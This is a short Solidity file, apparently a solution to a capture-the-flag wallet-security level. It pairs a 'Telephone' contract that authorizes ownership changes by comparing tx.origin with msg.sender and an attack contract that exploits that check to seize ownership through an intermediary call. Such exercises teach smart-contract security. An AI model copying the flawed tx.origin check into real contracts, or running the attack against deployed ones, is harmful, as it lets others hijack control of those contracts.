// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract TelephoneAttack
{

    Telephone immutable telephoneaddress;

    constructor(address _telephoneaddress)
    {
        telephoneaddress = Telephone(_telephoneaddress);
    }

    function attack() external 
    {
        telephoneaddress.changeOwner(msg.sender);
    }

}
 
